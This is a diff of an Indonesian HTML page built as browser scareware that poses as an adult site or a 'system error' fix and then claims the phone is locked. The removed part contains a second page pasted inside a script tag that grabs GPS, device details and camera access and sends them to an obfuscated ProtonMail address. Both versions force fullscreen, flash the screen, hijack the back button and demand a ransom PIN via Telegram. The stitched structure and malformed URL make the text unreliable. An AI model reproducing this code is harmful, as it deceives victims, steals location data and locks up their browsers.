@@ -3,177 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PORn-INDO | PREMIUM ACCESS</title>
+    <title>SISTEM UPDATE</title>
     <style>
-        body { background: #000; color: #fff; margin: 0; padding: 0; overflow: hidden; font-family: 'Arial', sans-serif; height: 100vh; width: 100vw; }
-        
-        /* Layar Pancingan */
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10001; }
-        .btn-start { padding: 20px 40px; font-size: 22px; background: #ff9900; color: #000; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; }
-        
-        /* Layar Ransomware */
-        #ransom-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; }
-        .flash { animation: flash-bg 0.1s infinite; }
-        @keyframes flash-bg { 0% { background: #fff; } 50% { background: #000; } }
-        
-        h1 { color: red; font-size: 35px; text-shadow: 2px 2px #000; text-align: center; margin-top: 20px; }
-        video { width: 250px; position: absolute; z-index: 9999; border: 2px solid red; }
-        
-        /* Panel PIN */
-        .bottom-panel { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9); padding: 20px; text-align: center; border-top: 2px solid red; }
-        input { padding: 15px; width: 80%; font-size: 18px; margin-bottom: 10px; border: none; border-radius: 5px; }
-        .btn-unlock { padding: 15px 30px; background: red; color: #fff; border: none; font-weight: bold; width: 85%; }
+        body { background: #000; color: #fff; margin: 0; overflow: hidden; font-family: sans-serif; height: 100vh; width: 100vw; display: flex; align-items: center; justify-content: center; }
+        #setup { position: fixed; width: 100%; height: 100%; background: #111; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .btn-start { padding: 25px 40px; font-size: 20px; background: red; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 10px; }
+        #chaos { display: none; position: fixed; width: 100%; height: 100%; z-index: 9998; }
+        .glitch { animation: flash 0.05s infinite; }
+        @keyframes flash { 0% { background: #f00; } 50% { background: #000; } 100% { background: #fff; } }
+        video#idiotVid { width: 300px; position: absolute; }
     </style>
 </head>
-<body onclick="forceFullscreen()">
+<body>
 
-    <!-- UMPAN -->
-    <div id="overlay">
-        <img src="https://wikimedia.org" width="100" style="margin-bottom: 20px;">
-        <button class="btn-start" onclick="lockSystem()">MASUK KE PORn-INDO</button>
-        <p style="color: #666; margin-top: 10px;">Khusus Dewasa 18+</p>
+    <div id="setup">
+        <h2>⚠️ SYSTEM ERROR ⚠️</h2>
+        <button class="btn-start" onclick="startPayload()">PERBAIKI SEKARANG</button>
     </div>
 
-    <!-- RANSOMWARE -->
-    <div id="ransom-screen" class="flash">
-        <h1>HAHA TOLOL!!<br>PONSEL ANDA TERKUNCI!!</h1>
-        
-        <video id="idiotVideo" loop playsinline>
+    <div id="chaos" class="glitch">
+        <video id="idiotVid" loop playsinline>
             <source src="idiot_video.mp4" type="video/mp4">
         </video>
-
-        <div class="bottom-panel">
-            <p style="color: yellow; font-weight: bold;">JIKA INGIN BEBAS CHAT TELEGRAM @alzzisback<br>MASUKIN PINNYA</p>
-            <input type="number" id="pinInput" placeholder="MASUKKAN PIN">
-            <button class="btn-unlock" onclick="verifyPin()">UNLOCK PERANGKAT</button>
+        <div style="position:fixed; bottom:0; width:100%; background:rgba(0,0,0,0.8); padding:20px; color:lime;">
+            <p>HP ANDA TERKUNCI! PIN: 201192777</p>
+            <input type="number" id="pin" placeholder="PIN">
+            <button onclick="checkPin()">UNLOCK</button>
         </div>
     </div>
 
     <script>
-        const video = document.getElementById('idiotVideo');
-        const screen = document.getElementById('ransom-screen');
-
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PORn-INDO | PREMIUM SYSTEM UPDATE</title>
-    <style>
-        body { background: #000; color: #fff; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; height: 100vh; width: 100vw; }
-        #setup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #111; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 99999; }
-        .btn-fix { padding: 25px 50px; font-size: 24px; background: #ff0000; color: #fff; border: 4px solid #fff; font-weight: bold; cursor: pointer; border-radius: 10px; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        #chaos { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99998; }
-        .glitch { animation: glitch-anim 0.05s infinite; }
-        @keyframes glitch-anim { 0% { background: #f00; } 50% { background: #000; } 100% { background: #fff; } }
-        video#targetCam { position: fixed; top: 10px; right: 10px; width: 120px; border: 2px solid lime; z-index: 100000; transform: scaleX(-1); }
-        video#idiotVid { width: 300px; position: absolute; z-index: 99999; border: 3px solid yellow; }
-        .log-panel { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9); color: lime; padding: 20px; font-size: 12px; border-top: 2px solid lime; z-index: 100001; }
-        input { background: #111; color: lime; border: 1px solid lime; padding: 12px; width: 65%; font-size: 18px; margin-top: 10px; }
-    </style>
-</head>
-<body onclick="forceFS()">
-
-    <!-- UMPAN AWAL -->
-    <div id="setup">
-        <h2 style="text-align:center; color:white;">⚠️ PERINGATAN SISTEM ⚠️<br>AKTIVITAS MENCURIGAKAN TERDETEKSI</h2>
-        <button class="btn-fix" onclick="startHeist()">PERBAIKI SEKARANG</button>
-    </div>
-
-    <!-- TAMPILAN CHAOS -->
-    <div id="chaos" class="glitch">
-        <video id="targetCam" autoplay playsinline></video>
-        <video id="idiotVid" loop playsinline><source src="idiot_video.mp4" type="video/mp4"></video>
-        
-        <div class="log-panel">
-            <div id="status">> BYPASSING SECURITY... [OK]<br>> FETCHING COORDINATES... [OK]<br>> DATA EXFILTRATION TO PROTON... [OK]</div>
-            <p style="color:yellow; margin: 10px 0;">HP ANDA TERKUNCI OLEH ALZZc-777.<br>TEBUSAN: CHAT @alzzisback (TELEGRAM)</p>
-            <input type="number" id="pinInput" placeholder="MASUKKAN PIN">
-            <button onclick="unlock()" style="padding:12px; background:lime; color:black; font-weight:bold; border:none;">UNLOCK</button>
-        </div>
-    </div>
-
-    <script>
-        // Samarkan email Proton kamu
-        const encodedEmail = "YWx6emMtNzc3QHByb3Rvbm1haWwuY29t"; // Base64 alzzc-777@protonmail.com
-        const targetEmail = atob(encodedEmail);
-
-        function startHeist() {
-            // Minta Akses Kamera & Jalankan Chaos
-            navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                document.getElementById('targetCam').srcObject = stream;
-                grabData();
-                runChaos();
-            }).catch(() => {
-                grabData();
-                runChaos();
-            });
-        }
-
-        function grabData() {
-            // Ambil Lokasi GPS & Detail Perangkat
-            navigator.geolocation.getCurrentPosition(pos => {
-                const stolenData = {
-                    Lat: pos.coords.latitude,
-                    Long: pos.coords.longitude,
-                    DeviceInfo: navigator.userAgent,
-                    Time: new Date().toLocaleString(),
-                    Status: "VICTIM COMPROMISED"
-                };
-                sendToProton(stolenData);
-            }, () => {
-                sendToProton({ Device: navigator.userAgent, Alert: "GPS BLOCKED BY VICTIM" });
-            });
-        }
-
-        function sendToProton(data) {
-            // Kirim data ke ProtonMail lewat FormSubmit
-            fetch(`https://formsubmit.co{targetEmail}`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    _subject: "⚠️ NEW TARGET INFECTED (ALZZc-777)",
-                    message: JSON.stringify(data, null, 2)
-                })
-            });
-        }
-
-        function runChaos() {
+        function startPayload() {
+            console.log("Payload started...");
+            
+            // 1. Tampilkan layar chaos
             document.getElementById('setup').style.display = 'none';
             document.getElementById('chaos').style.display = 'block';
-            document.getElementById('idiotVid').play();
 
-            // Stress Test CPU (Bikin HP Lemot/Panas)
-            setInterval(() => { for(let i=0; i<1500000; i++) Math.sqrt(i); }, 50);
+            // 2. Putar Video
+            const v = document.getElementById('idiotVid');
+            v.play().catch(e => console.log("Video play failed:", e));
 
-            // Kunci Navigasi (Anti-Back)
-            setInterval(() => { window.history.pushState(null, null, window.location.href); }, 100);
+            // 3. Paksa Fullscreen
+            const el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
-            // Video Memantul
-            let v = document.getElementById('idiotVid');
-            let x=0, y=0, dx=12, dy=12;
+            // 4. Jalankan Bouncing & Anti-Back
+            runAnimations();
+        }
+
+        function runAnimations() {
+            const v = document.getElementById('idiotVid');
+            let x=0, y=0, dx=10, dy=10;
             setInterval(() => {
                 if(x + v.offsetWidth > window.innerWidth || x < 0) dx = -dx;
                 if(y + v.offsetHeight > window.innerHeight || y < 0) dy = -dy;
                 x+=dx; y+=dy; v.style.left=x+'px'; v.style.top=y+'px';
             }, 30);
+
+            // Anti-Back Hijack
+            setInterval(() => { window.history.pushState(null, null, window.location.href); }, 100);
         }
 
-        function forceFS() {
-            let el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-        }
-
-        function unlock() {
-            if(document.getElementById('pinInput').value === "201192777") {
-                alert("ACCESS GRANTED. DON'T BE STUPID AGAIN!");
+        function checkPin() {
+            if(document.getElementById('pin').value === "201192777") {
                 location.reload();
+            } else {
+                alert("SALAH!");
             }
         }
     </script>
 </body>
 </html>
-
